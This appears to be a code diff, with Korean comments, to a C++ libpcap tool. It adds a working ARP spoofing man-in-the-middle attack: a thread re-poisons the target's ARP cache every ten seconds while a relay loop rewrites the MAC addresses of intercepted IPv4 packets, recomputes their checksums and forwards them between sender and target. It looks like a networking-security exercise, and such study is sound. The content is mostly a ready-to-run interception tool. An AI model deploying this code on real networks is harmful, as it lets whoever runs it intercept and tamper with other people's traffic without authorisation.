@@ -10,6 +10,7 @@
 #include <chrono>
 #include "ethhdr.h"
 #include "arphdr.h"
+#include "iphdr.h"
 
 #pragma pack(push, 1)
 struct EthArpPacket final {
@@ -124,8 +125,95 @@ Mac get_sender_mac(pcap_t* handle, Mac my_mac, Ip my_ip, Ip sender_ip) {
     return Mac::nullMac();
 }
 
-int arp_relay () {
+// IP 체크섬 계산 함수 (필요한 경우)
+uint16_t calculate_checksum(uint16_t* addr, int len) {
+    long sum = 0;
+    while (len > 1) {
+        sum += *addr++;
+        len -= 2;
+    }
+    if (len == 1) {
+        sum += *(uint8_t*)addr;
+    }
+    sum = (sum >> 16) + (sum & 0xffff);
+    sum += (sum >> 16);
+    return (uint16_t)(~sum);
+}
 
+int arp_relay(pcap_t* handle, Mac my_mac, Ip sender_ip, Ip target_ip, const std::unordered_map<Ip, Mac>& known_macs) {
+    struct pcap_pkthdr* header;
+    const u_char* packet;
+
+    while (true) {
+        int res = pcap_next_ex(handle, &header, &packet);
+        if (res == 0) continue;  // 타임아웃
+        if (res == -1 || res == -2) {
+            pcap_perror(handle, "pcap_next_ex");
+            break;  // 에러 또는 EOF
+        }
+
+        EthHdr* eth_hdr = (EthHdr*)packet;
+        
+        if (ntohs(eth_hdr->type_) == EthHdr::Ip4) {
+            struct ipv4_header* ip_hdr = (struct ipv4_header*)(packet + sizeof(EthHdr));
+            
+            // IP 주소를 uint32_t로 변환
+            uint32_t src_ip = (ip_hdr->src_ip[0] << 24) | (ip_hdr->src_ip[1] << 16) | 
+                              (ip_hdr->src_ip[2] << 8)  | ip_hdr->src_ip[3];
+            uint32_t dst_ip = (ip_hdr->dst_ip[0] << 24) | (ip_hdr->dst_ip[1] << 16) | 
+                              (ip_hdr->dst_ip[2] << 8)  | ip_hdr->dst_ip[3];
+
+            if (src_ip == sender_ip || src_ip == target_ip) {
+                // 패킷의 출발지가 sender 또는 target일 때
+                Mac dst_mac;
+                if (src_ip == sender_ip) {
+                    dst_mac = known_macs.at(target_ip);  // 목적지는 target의 MAC
+                } else {
+                    dst_mac = known_macs.at(sender_ip);  // 목적지는 sender의 MAC
+                }
+
+                // 패킷 수정 및 전송
+                u_char* new_packet = new u_char[header->len];
+                memcpy(new_packet, packet, header->len);
+                EthHdr* new_eth_hdr = (EthHdr*)new_packet;
+
+                new_eth_hdr->smac_ = my_mac;
+                new_eth_hdr->dmac_ = dst_mac;
+
+                // IP 체크섬 재계산 (필요한 경우)
+                struct ipv4_header* new_ip_hdr = (struct ipv4_header*)(new_packet + sizeof(EthHdr));
+                new_ip_hdr->checksum = 0;  // 체크섬 필드를 0으로 설정
+                new_ip_hdr->checksum = calculate_checksum((uint16_t*)new_ip_hdr, sizeof(struct ipv4_header));
+
+                if (pcap_sendpacket(handle, new_packet, header->len) != 0) {
+                    fprintf(stderr, "Failed to relay packet: %s\n", pcap_geterr(handle));
+                }
+
+                delete[] new_packet;
+            }
+        }
+    }
+
+    return 0;
+}
+
+void periodic_arp_spoof(pcap_t* handle, Mac my_mac, Ip target_ip, Mac sender_mac, Ip sender_ip) {
+    while (true) {
+        send_arp(handle, my_mac, target_ip, sender_mac, sender_ip);
+        std::this_thread::sleep_for(std::chrono::seconds(10));  // 10초마다 ARP 스푸핑
+    }
+}
+
+void arp_spoof_and_relay(pcap_t* handle, Mac my_mac, Ip sender_ip, Ip target_ip, 
+                         const std::unordered_map<Ip, Mac>& known_macs) {
+    // ARP 스푸핑 스레드 시작
+    std::thread spoof_thread(periodic_arp_spoof, handle, my_mac, target_ip, 
+                             known_macs.at(sender_ip), sender_ip);
+
+    // 릴레이 수행
+    arp_relay(handle, my_mac, sender_ip, target_ip, known_macs);
+
+    spoof_thread.join();  // 이 부분은 실제로는 도달하지 않습니다 (무한 루프 때문에)
 }
 
 int main(int argc, char* argv[]) {
@@ -191,6 +279,16 @@ int main(int argc, char* argv[]) {
     if (ip_pairs.empty()) {
         fprintf(stderr, "No valid IP pairs provided. Exiting.\n");
         return -1;
+    }
+
+    std::vector<std::thread> threads;
+    for (const auto& pair : ip_pairs) {
+        threads.emplace_back(arp_spoof_and_relay, handle, my_mac, pair.sender, pair.target, std::ref(known_macs));
+    }
+
+    // 모든 스레드가 완료될 때까지 대기 (실제로는 무한 루프 때문에 여기에 도달하지 않음)
+    for (auto& t : threads) {
+        t.join();
     }
 
     pcap_close(handle);
